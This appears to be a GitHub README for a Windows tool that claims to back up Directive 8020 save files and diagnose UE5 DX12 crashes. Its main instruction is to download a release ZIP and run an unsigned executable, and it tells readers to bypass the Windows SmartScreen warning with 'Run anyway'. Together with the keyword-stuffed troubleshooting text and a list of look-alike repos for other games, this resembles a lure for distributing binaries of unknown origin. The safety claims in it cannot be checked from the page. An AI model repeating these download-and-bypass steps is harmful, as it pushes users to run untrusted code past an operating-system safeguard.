<p align="center">
  <img src="https://i.postimg.cc/SsTNhdXg/banner.png" alt="Directive 8020 Branch Save Vault — Crew Save Backups & UE5 Crash Checks for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Save%20%26%20Crash%20Audit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-directive8020--saves--26.11a-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# Directive 8020 Branch Save Vault — Crew Save Backups & UE5 Crash Checks for Windows

**Directive 8020 save slot missing or showing 0 KB after an abrupt exit? Wanting safe dated backups before high-stakes crew choices, or troubleshooting UE5 DX12 crashes on launch? Protect your SaveGames folder first.**

Directive 8020 Branch Save Vault focuses on Supermassive Games' Unreal Engine 5 save structure on Windows: **single-player and Movie Night / co-op save slots reside inside `%LOCALAPPDATA%\Directive8020\Saved\SaveGames`**, where rapid autosave writes during quick-time events can be disrupted by crashes or Steam Cloud conflicts.

This project is aimed at **Directive 8020 on Windows PC (Steam)**. It concerns `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` backups, `0 KB` save file detection, and UE5 DX12 config checks—not editing character survival flags.

## Quick Symptom & Cause Reference

| Symptom / Error | Likely Cause | Recommended Check |
| --- | --- | --- |
| Save slot missing or `0 KB` after crash | Game crashed mid-autosave during a rapid QTE decision | Back up `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` before relaunching |
| Wanting snapshots before crew-survival choices | Single overwritten autosave slot locks narrative outcomes | Archive `<SteamID64>` save folders by chapter in Documents |
| UE5 DX12 crash or black screen on startup | Outdated GPU driver or invalid display flags in `GameUserSettings.ini` | Inspect `Saved\Logs` and back up `Config\Windows` |
| Hitching during cinematic camera cuts | Insufficient free space on `C:` for DirectX 12 shader caching | Verify `C:` disk space and GPU driver shader cache settings |

## Download for Windows

[**Download Directive8020Saves.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/Directive8020Saves.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why run `Directive8020Saves.exe`? (Automatic checks in ~2 seconds)

- Scans `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` and flags any truncated `0 KB` `.sav` files immediately.
- Lists all `<SteamID64>` save profiles with exact byte sizes and timestamps so you can back up safely.
- Inspects `Saved\Config\Windows\GameUserSettings.ini` and scans `Saved\Logs` for D3D12 errors.
- Checks drive `C:` free space required for Unreal Engine 5 shader compilation.

### Sample Diagnostic Output

```text
[Directive8020Saves] Inspecting Directive 8020 UE5 SaveGames & Logs...
[OK]   Saved Directory  : C:\Users\Player\AppData\Local\Directive8020\Saved
[OK]   SaveGames        : SaveGames\76561198041299104 (4 .sav files, all > 0 KB)
[OK]   Config           : Config\Windows\GameUserSettings.ini (3.4 KB)
[OK]   Crash Logs       : No fatal D3D12 errors in Saved\Logs
[OK]   System Drive C:  : 54.2 GB free
```

The release ZIP is named `Directive8020Saves.zip`; the Windows executable inside is named `Directive8020Saves.exe`.

1. Close Directive 8020 before moving or checking game files.
2. Click **Download Directive8020Saves.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `Directive8020Saves.exe`.
5. Review the reported locations and status checks before making any changes to your files.
6. Restart Directive 8020 and verify behavior after applying any recommended fixes.

**Requirements:** Windows 10 or 11 (64-bit), a Windows Steam installation of Directive 8020, and access to `%LOCALAPPDATA%\Directive8020`.

### Verification & Windows SmartScreen Note

- **Read-only & standard user permissions:** `Directive8020Saves.exe` runs without administrator rights and does not modify game binaries, system registry keys, or Windows Defender settings.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project focuses on

### Save slot disappears or drops to `0 KB` after a crash during autosave

Because Directive 8020 autosaves immediately after life-or-death decisions, a crash mid-write can leave a `0 KB` file. Backing up `SaveGames` before relaunching prevents Steam Cloud from overwriting surviving slots.

### Protecting crew-survival milestones before branching chapters

Creating dated snapshots of `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` lets you archive clean checkpoints without risking your main playthrough.

### UE5 DirectX 12 crash or black screen on startup

Outdated GPU drivers or corrupted flags in `Saved\Config\Windows\GameUserSettings.ini` can trigger startup crashes.

### Shader compilation hitches during cinematic transitions

Ensuring sufficient free space on drive `C:` and updated GPU drivers keeps UE5 pipeline compilation smooth.

## Where Directive 8020 files normally belong

On Windows Steam setups, all save slots, configs, and crash logs reside inside `%LOCALAPPDATA%\Directive8020\Saved`:

```text
%LOCALAPPDATA%\Directive8020\Saved\
```

Inside that structure, key files and subdirectories typically look like this:

```text
%LOCALAPPDATA%\Directive8020\Saved\
├── Config\
│   └── Windows\
│       └── GameUserSettings.ini
├── Logs\
└── SaveGames\
    └── <SteamID64>\
```

Never delete or rename individual `.sav` files inside `<SteamID64>` without backing up the entire folder first, as slot metadata files are linked.

## A practical troubleshooting checklist

If your issue still persists, work through these checks in order:

1. **Exit Directive 8020 completely.** Confirm the game process is closed in Task Manager and wait for Steam Cloud sync.
2. **Back up `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` immediately.** Copy the entire `SaveGames` directory to a dated folder in Documents.
3. **Inspect `.sav` file sizes and timestamps.** Check whether any save file dropped to `0 KB` after a crash.
4. **Update GPU drivers and verify `C:` free space.** Ensure at least 15 GB free on drive `C:` for UE5 DirectX 12 shader caches.
5. **Verify installed files in Steam.** Run **Steam → Library → Directive 8020 → Properties → Installed Files → Verify integrity of game files**.
6. **Back up `GameUserSettings.ini` before resetting display options.** Keep a copy of your config before testing windowed vs. fullscreen modes.
7. **Restart Directive 8020 and verify your save slots.** Confirm chapters and crew status appear properly.

### Before moving any files

Keep an untouched copy of `%LOCALAPPDATA%\Directive8020\Saved\SaveGames` outside `%LOCALAPPDATA%` before testing cloud-sync recovery.

## What an effective diagnostic report should tell you

A clear diagnostic check locates **`%LOCALAPPDATA%\Directive8020\Saved\SaveGames`**, prints exact byte sizes and timestamps for every `.sav` file, flags `0 KB` anomalies, and checks `Config\Windows`.

## FAQ

**Where are Directive 8020 save files stored on Windows?**

Inside `%LOCALAPPDATA%\Directive8020\Saved\SaveGames\<SteamID64>\`.

**Can a 0 KB Directive 8020 save file be recovered?**

A zero-byte file has no payload on its own; recovery requires restoring from an intact local backup or Steam Cloud copy.

**How do I back up my Directive 8020 save before a big choice?**

Exit to the main menu, close the game, and copy the `SaveGames` folder to Documents.

**Does this tool edit character deaths or collectibles?**

No. It performs read-only save inspection and backup guidance.

**Are any game files bundled with this repository?**

No copyrighted game files are included here.

## Useful reading

- [The Dark Pictures Official Website (Supermassive Games)](https://www.thedarkpictures.com/)
- [Directive 8020 on Steam](https://store.steampowered.com/app/2255370/Directive_8020/)

## More Windows Game Diagnostic Tools

- [Judas-UE5SaveFrameGuard](../Judas-UE5SaveFrameGuard) — Judas UE5 branching story save backup & shader guard
- [Dreadmoor-SaveCheck](../Dreadmoor-SaveCheck) — DREADMOOR missing save & progress rollback diagnostics
- [Permafrost-SaveGuard](../Permafrost-SaveGuard) — Permafrost `BackupSaves` & `.pfs` world recovery check
- [Subnautica2-CoopSaveSentinel](../Subnautica2-CoopSaveSentinel) — Subnautica 2 Early Access world save & `~mods` sentinel

*Independent community project. Not affiliated with Supermassive Games, Bandai Namco Entertainment, Valve, or Steam. All trademarks belong to their respective owners.*
 
 
 
 
